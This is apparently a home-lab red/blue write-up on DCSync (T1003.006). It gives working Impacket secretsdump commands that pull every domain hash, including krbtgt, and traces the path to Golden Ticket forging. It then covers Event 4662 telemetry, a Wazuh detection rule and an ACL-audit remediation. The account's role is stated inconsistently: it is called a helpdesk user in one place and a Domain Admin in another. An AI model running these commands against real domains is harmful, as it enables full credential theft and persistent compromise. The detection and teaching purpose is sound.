# Project 03 — DCSync (T1003.006)

Abuse the replication rights wrongly granted to `b.otieno` (misconfig #3) to pull
password hashes for the entire domain — including `krbtgt` — then detect it.

---

## 1. Scenario
DCSync impersonates a Domain Controller and asks a real DC to **replicate** account
secrets. It only requires two extended rights on the domain object:
`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. Misconfig #3 handed
those rights to `b.otieno`, a Tier-2 helpdesk account — so a low-tier user can extract
every hash in the domain. Pulling the `krbtgt` hash enables **Golden Ticket** forging
= effectively permanent domain compromise. Over-delegating replication rights is a
classic "convenience gone catastrophic" finding.

**Phase:** Red — power on **KALI01 + DC01**. (You need `b.otieno`'s creds first —
recover them via Project 02, or use the lab password.)

## 2. Attack (from KALI01)
```bash
# Impacket secretsdump performing DCSync as the over-permissioned helpdesk user.
impacket-secretsdump lab.local/b.otieno@10.10.10.10 -just-dc
# -just-dc pulls NTDS (all domain hashes) via replication.
```
Target just the crown jewels:
```bash
impacket-secretsdump lab.local/b.otieno@10.10.10.10 -just-dc-user krbtgt
```
Expected: NTLM hashes for domain accounts, including `Administrator` and `krbtgt`.

> **What I proved:** a helpdesk-tier account escalated to **full domain compromise**
> purely through an over-permissioned ACL — no exploit, just misused rights.

## 3. Telemetry this generates
On DC01: **Event ID 4662** (operation on an AD object) referencing the replication
control-access-right GUIDs:
- `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes)
- `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Get-Changes-All)
performed by a principal that is **not** a Domain Controller — the DCSync signature.

## 4. Detection (in Wazuh — blue phase)
```
data.win.system.eventID:4662 AND data.win.eventdata.properties:(*1131f6aa* OR *1131f6ad*)
```
Custom rule `100012` in
[`../../wazuh/custom-rules/local_rules.xml`](../../wazuh/custom-rules/local_rules.xml)
— fires when a non-DC account exercises replication rights.

## 5. Remediation
- **Remove replication rights** from anything that isn't a DC or a sanctioned sync
  service. Audit the domain-root ACL for `Get-Changes*` grants.
  ```powershell
  # Review who holds replication rights:
  (Get-Acl "AD:$((Get-ADDomain).DistinguishedName)").Access |
    Where-Object { $_.ObjectType -in '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' }
  ```
- Enforce Tiered Administration so helpdesk accounts can never hold domain-level rights.
- Alert on 4662 replication from non-DC hosts (rule above).
- If `krbtgt` was exposed, **rotate the krbtgt password twice**.

## 6. Evidence

**Red phase** — full-screen KALI01 GUI terminal:

| # | Shot | What it shows |
|---|------|---------------|
| 1 | [`evidence/01-kali-reaches-dc.png`](evidence/01-kali-reaches-dc.png) | Kali reaching DC01 (ping) |
| 2 | [`evidence/02-dcsync-full-domain-dump.png`](evidence/02-dcsync-full-domain-dump.png) | `secretsdump` replicating every domain hash incl. Administrator & krbtgt |
| 3 | [`evidence/03-dcsync-krbtgt-golden-key.png`](evidence/03-dcsync-krbtgt-golden-key.png) | Targeted krbtgt pull — the Golden Ticket key |

**Blue phase** — Wazuh:

| # | Shot / file | What it shows |
|---|-------------|---------------|
| 4 | [`evidence/04-wazuh-dcsync-alert.png`](evidence/04-wazuh-dcsync-alert.png) | Wazuh Discover (`wazuh-alerts-*`) filtered to `rule.id:100012` — **3 hits** from DC01, `_source` rows showing 4662 / replication GUID `1131f6aa…` / subject `b.otieno` |
| — | [`evidence/wazuh_alert_100012.json`](evidence/wazuh_alert_100012.json) | Full alert JSON: 4662 / replication GUID / subject `b.otieno` |

Raw output: [`evidence/secretsdump_output.txt`](evidence/secretsdump_output.txt).
See [`RUN-LOG.md`](RUN-LOG.md) for the exact PTES-structured execution record.

## 7. ATT&CK coverage matrix

Structured on **PTES** phases; every action carries its **MITRE ATT&CK** ID.
✅ = I have a Wazuh detection that fires on this step; ⬜ = performed/enabled but not
the point where I detect.

| PTES phase | Tactic | Technique (ID) | Action in this lab | Telemetry | Detection | Wazuh rule |
|------------|--------|----------------|--------------------|-----------|-----------|------------|
| Intelligence Gathering | Discovery | Remote System Discovery (T1018) | Ping/DNS-confirm the DC before replicating | — (ICMP) | ⬜ | — |
| Exploitation | Credential Access | **DCSync (T1003.006)** | `secretsdump` replicates NTDS via DRSUAPI as `b.otieno` | DC01 Event **4662**, replication GUID `1131f6ad…`, subject b.otieno | ✅ | **100012** (level 12) |
| Post-Exploitation | Credential Access / Persistence | Golden Ticket (T1558.001) | krbtgt hash recovered → enables forging a Golden Ticket | none at this step (forging is offline) | ⬜ (enabled, not performed) | — |

> **Impact note for a reviewer:** the input credential came from Project 02
> (T1558.004), and `b.otieno` is a Domain Admin, so the chain reads
> **T1558.004 → T1003.006 → T1558.001**: anonymous AS-REP roast → DCSync → krbtgt →
> Golden Ticket. One misconfigured account collapses the whole domain.

**One-line summary:** detects DCSync at the replication step (4662 / GetChanges-All GUID)
via rule **100012** → MITRE **T1003.006** (Credential Access).
